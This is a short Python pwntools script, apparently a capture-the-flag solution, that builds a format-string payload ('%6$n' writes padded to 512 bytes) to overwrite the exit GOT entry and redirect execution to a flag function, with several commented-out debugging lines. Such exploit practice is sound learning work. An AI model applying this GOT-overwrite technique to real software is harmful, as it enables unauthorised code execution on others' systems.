# flag_func = 0x00000000004011b6
# vuln -> exit -> call 0x4010c0 -> jump to 0x2f6d
# 0x404038 <exit@got.plt>:        0x00401070

import struct 
from pwn import *

flag_func = 0x4011b6
EXIT_PLT = 0x0000000000404038
# vuln = 0x4011d4 
# EXIT_PLT = 0x8049724

def pad(s):
    return s+"X"*(512-len(s))

# print(bytes.fromhex(EXIT_PLT))
a = struct.pack("I",EXIT_PLT)
print(a)
# b = struct.unpack("I", a)
# print(hex(b[0]))
# print(bytes([EXIT_PLT]))
exploit = ""
exploit += "8@@\x00"
exploit += "AAAABBBBCCCC"
exploit += "%6$n "*4

print(pad(exploit))